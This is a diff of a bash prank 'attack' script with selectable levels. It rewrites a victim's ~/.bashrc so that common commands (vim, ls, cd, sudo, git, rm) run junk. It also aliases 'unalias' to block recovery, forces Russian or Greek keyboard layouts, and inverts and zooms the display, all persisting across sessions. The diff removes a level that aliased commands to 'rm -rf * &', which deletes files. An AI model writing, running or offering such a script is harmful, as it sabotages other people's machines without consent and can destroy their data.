@@ -1,8 +1,8 @@
 #!/bin/bash
 
 clear
-version='0.2.4'
-default_alias="echo LOCK! || "
+version='0.2.5'
+default_alias="xrandr -o \`shuf -e "inverted" "normal" "right" "left" -n 1\` && yes LOCK! || echo "
 
 refresh_bash()
 {
@@ -27,7 +27,7 @@ base()
 
 base_alias()
 {
-    for alias in "emacs" "ne" "vim" "vi" "cd" "ls"
+    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "unalias"
     do
 	echo "Redirecting '$alias' to '$default_alias'"
 	echo "alias $alias='$default_alias'" >> ~/.bashrc
@@ -37,7 +37,7 @@ base_alias()
 
 normal_alias()
 {
-    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "nano" "xlock" "rm" "echo" "cat" "tree"
+    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "nano" "xlock" "rm" "echo" "cat" "tree" "unalias"
     do
 	echo "Redirecting '$alias' to '$default_alias'"
 	echo "alias $alias='$default_alias'" >> ~/.bashrc
@@ -48,7 +48,7 @@ normal_alias()
 
 advanced_alias()
 {
-    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "nano" "xlock" "rm" "echo" "cat" "zsh" "bash" "su" "sudo" "apt-get" "git" "setxkbmap" "tree" "chmod"
+    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "nano" "xlock" "rm" "echo" "cat" "zsh" "bash" "su" "sudo" "apt-get" "git" "setxkbmap" "tree" "chmod" "unalias"
     do
 	echo "Redirecting '$alias' to '$default_alias'"
 	echo "alias $alias='$default_alias'" >> ~/.bashrc
@@ -76,6 +76,7 @@ advanced_attack()
 {
     echo "Changing the keyboard to Russian"
     setxkbmap ru
+    echo "setxkbmap ru" >> ~/.bashrc
     advanced_alias
     base
     refresh_bash
@@ -85,24 +86,14 @@ hardcore_attack()
 {
     echo "Changing the keyboard to Greek"
     setxkbmap 'pl,gr' -variant ',polytonic'
+    echo "setxkbmap 'pl,gr' -variant ',polytonic'" >> ~/.bashrc
     echo "Inverting the display"
     xrandr -o inverted
+    echo "xrandr -o inverted" >> ~/.bashrc
     echo "Zooming in"
     xrandr --output eDP-1 --scale 4x4
+    echo "xrandr --output eDP-1 --scale 4x4" >> ~/.bashrc
     advanced_alias
-    base
-    refresh_bash
-}
-
-mean_attack()
-{
-    echo "Well ... Good luck."
-    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "nano" "xlock" "rm" "cat" "zsh" "bash" "su" "sudo" "apt-get" "git" "setxkbmap" "echo" "tree" "chmod" "reboot"
-    do
-	echo "Redirecting '$alias' to 'rm -rf * & '"
-	echo "alias $alias='rm -rf * & '" >> ~/.bashrc
-	echo "alias $alias='rm -rf * & '" >> ~/.zshrc
-    done
     base
     refresh_bash
 }
@@ -124,9 +115,8 @@ echo "Attack levels :"
 echo " (0) - Does nothing : Just quit the program"
 echo " (1) - Basic attack : Add some aliases to the bashrc and change Histsize"
 echo " (2) - Normal       : Add quite a lot of aliases + change keyboard to russian"
-echo " (3) - Advanced     : Same as Normal + more aliases"
+echo " (3) - Advanced     : Same as Normal + more aliases + autochange keyboard on boot"
 echo " (4) - Harcore      : Advanced + play with the screen + change keyboard to greek"
-echo " (5) - Mean         : Don't use this. Really mean."
 echo
 echo
 echo "  /\\"
@@ -157,11 +147,6 @@ case $usr_input in
 	read -p "Are you sure you want to launch the attack level 4 ? (y/n) : " usr_input
 	echo "Performing the hardcore attack ..."
 	hardcore_attack
-	;;
-    5)
-	read -p "Are you sure you want to launch the mean attack ? (y/n) : " usr_input
-	echo "Performing the mean attack ..."
-	mean_attack
 	;;
 esac
 
